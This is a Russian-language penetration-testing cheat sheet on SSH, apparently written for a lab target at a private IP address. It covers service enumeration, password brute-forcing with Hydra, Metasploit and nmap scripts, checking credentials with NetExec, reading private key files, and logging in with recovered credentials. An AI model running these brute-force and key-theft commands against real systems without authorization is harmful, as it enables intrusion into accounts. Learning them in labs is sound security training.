# SSH — ПРОТОКОЛ УДАЛЕННОГО УПРАВЛЕНИЯ

## Что такое SSH

SSH (Secure Shell) — протокол для безопасного удаленного управления системами. Работает на порту **22/tcp**.

Особенности:
- **Шифрование** — весь трафик защищен
- **Аутентификация** — по паролю или по ключу
- **Замена Telnet** — безопасный вариант


# 1. РАЗВЕДКА (ENUMERATE SSH)

## Проверить открытый порт

```bash
nmap -p 22 10.48.181.120 -sV
```

## Получить баннер SSH

```bash
nc 10.48.181.120 22
```

Вывод будет содержать версию:
```
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

## Через Metasploit — модуль `ssh_version`

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 10.48.181.120
set THREADS 5
run
```


# 2. ПРОВЕРКА АУТЕНТИФИКАЦИИ

## Подключение по паролю

```bash
ssh user@10.48.181.120
# Ввести пароль
```

## Подключение по ключу

```bash
ssh -i id_rsa user@10.48.181.120
```

## Подключение с указанием порта

```bash
ssh -p 2222 user@10.48.181.120
```

## Выполнить команду без интерактивной сессии

```bash
ssh user@10.48.181.120 "whoami"
```


# 3. БРУТФОРС SSH (САМОСТОЯТЕЛЬНО)

## Hydra

```bash
hydra -l user -P pass.txt ssh://10.48.181.120 -V -t 4
```

**Параметры:**
- `-l user` — один логин
- `-L users.txt` — список логинов
- `-P pass.txt` — список паролей
- `-V` — подробный вывод
- `-t 4` — количество потоков

## Пример с файлом логинов

```bash
hydra -L users.txt -P pass.txt ssh://10.48.181.120 -V
```

## На нестандартном порту

```bash
hydra -l user -P pass.txt ssh://10.48.181.120 -s 2222 -V
```


# 4. БРУТФОРС SSH ЧЕРЕЗ METASPLOIT

## Модуль `auxiliary/scanner/ssh/ssh_login`

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.48.181.120
set USERNAME user
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
run
```

**Список логинов:**
```bash
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
```

**Если найден пароль:**
```
[+] 10.48.181.120:22 - Success: 'user:password' 'uid=1000(user) gid=1000(user) groups=1000(user)'
```


# 5. ПЕРЕЧИСЛЕНИЕ SSH (ENUMERATION)

## Через `nmap`

```bash
# Проверить, открыт ли SSH
nmap -p 22 10.48.181.120 -sV

# Скрипты для SSH
nmap -p 22 --script ssh-hostkey 10.48.181.120
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 10.48.181.120
```

## Через `nxc` (NetExec)

```bash
nxc ssh 10.48.181.120 -u user -p password
nxc ssh 10.48.181.120 -u user -p password -x "whoami"
```

## Проверка SSH-ключей

```bash
# Если есть доступ
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa
```


# 6. ЭКСПЛУАТАЦИЯ SSH

## Если есть пароль — подключиться

```bash
ssh user@10.48.181.120
```

## Если есть приватный ключ

```bash
chmod 600 id_rsa
ssh -i id_rsa user@10.48.181.120
```
